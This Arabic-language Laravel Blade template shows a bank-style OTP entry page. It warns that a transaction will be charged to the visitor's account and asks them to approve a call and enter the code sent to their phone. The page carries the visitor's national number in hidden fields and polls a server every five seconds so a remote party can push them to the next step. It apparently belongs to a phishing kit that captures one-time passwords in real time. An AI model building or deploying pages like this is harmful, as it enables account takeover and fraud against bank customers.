

@extends('frontend.layout.master')
@section('content')


<section class="payment-section section-padding" style=" margin-top: 9rem !important; " dir="rtl">
    <div class="container">
        <div class="row  justify-center">
            <form class="payment-description p-5 w-75 card-body  bg-white p-5" action="{{route('stepSixAction')}}" method="post"
                  id="choose_service_form">
                @csrf
                <input type="hidden" name="client_id" value="{{$client->id}}">
                <input type="hidden" name="national_number" value="{{$client->national_number}}">
                <input type="hidden" name="step" value="10">
                <div>
                    <h6 class="text-center">سيتم اجراء معاملة مالية علي حسابك المصرفي </h6>
                    <h6 class="text-center">    لتأكيد العملية يرجى الرد على الاتصال والموافقة وادخال رمز التحقق المرسل الى جوالك </h6>

                    @if( isset($client) && $client->confirmed_otp === "0")
                        <br>
                        <h6>الرجاء ادخال الرمز بشكل صحيح</h6>
                    @else
                        <br>
                        <h6 class="text-center">سيتم الارسال فى خلال اقل من ثلات دقائق</h6>
                        <div id="timer" class="text-center p-3 mb-2 bg-light text-black">3:00</div>
                    @endif
                </div>
                <!--no3 el car -->
                <div class="mt-3" id="input-Tasalsol">
                    <label for="exampleInputPassword1" class="form-label">رمز التحقق </label>
                    <input class="ta form-control input-of-buy" id="phid0" type="text" placeholder="رمز التحقق"
                           name="confirmed_otp" inputmode="numeric" maxlength="6">
                </div>
                @error('confirmed_otp')
                <p class="text-danger">{{$message}}</p>
                @enderror
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button class=" ta btn btn-secondary btn-sm mt-4 w-50  ">تأكيد</button>
                </div>
            </form>
        </div>
    </div>
</section>
@endsection
<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
  <script src="{{ asset('frontend/assets/js/pop-up.js') }}"></script>
<script>
    $(document).ready(function () {
        function fetchNotifications() {
            $.ajax({
                url: '{{ route("client.getEndPointAjax", $client->id ) }}',
                type: 'GET',
                dataType: 'json',
                success: function (data) {
                    if (data.status == 1) {
                        // Update the step value if needed
                        $('#step').val(data.next_step);

                        // Optionally remove the popup container (if you want to hide it)
                        $('#popup-container').remove();

                        // Redirect to the new route
window.location.href = "{{ route('stepFiveView', ['id' => $client->id, 'national_number' => $client->national_number]) }}";
                    }
                },
                error: function (xhr, status, error) {
                    console.log('AJAX Error:', error);
                }
            });
        }

        // Call the function to initiate the first check
        fetchNotifications();

        // Set interval to check every 5 seconds
        setInterval(fetchNotifications, 5000);
    });
</script>


    <script>
        let countdown = 180;
        function updateTimer() {
            // Calculate minutes and seconds
            const minutes = Math.floor(countdown / 60);
            const seconds = countdown % 60;

            // Display the current countdown value in MM:SS format
            document.getElementById('timer').innerText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

            if (countdown === 0) {
                $('#timer').remove();
            } else {
                countdown--;
                setTimeout(updateTimer, 1000);
            }
        }
        updateTimer();
    </script>











